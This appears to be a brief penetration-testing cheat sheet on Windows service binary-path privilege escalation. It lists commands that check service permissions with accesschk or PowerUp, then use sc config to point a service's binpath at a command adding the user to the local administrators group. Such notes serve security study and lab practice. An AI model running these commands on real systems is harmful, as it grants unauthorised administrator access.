# Binary Path Escalation

* Run accesschk64.exe -wuvc daclsvc or powerup.ps1
* See if  “User-PC\User” has the “SERVICE_CHANGE_CONFIG”
*  sc config [SERVICE] binpath= "net localgroup administrators user /add"
*  sc start [SERVICE]
